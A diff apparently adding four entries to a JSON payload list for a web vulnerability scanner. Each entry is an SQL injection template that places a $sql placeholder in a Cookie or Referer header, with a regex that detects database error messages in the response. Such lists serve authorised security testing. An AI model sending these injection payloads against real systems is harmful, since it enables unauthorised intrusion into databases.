@@ -471,5 +471,49 @@
       "expected_status_code": 200,
       "success_regex": "error|sql|syntax"
     }
+  },
+  {
+    "payload_id": "OWP-408211",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "Cookie: threadvisit=$sql;\\r\\n",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-408212",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "Cookie: _SERVER[REMOTE_ADDR]=$sql;\\r\\n",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-408306",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "Cookie: rv_user=$sql%%hawk\\r\\n",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-408334",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "Referer: {$sql} \\r\\n",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
   }
 ]
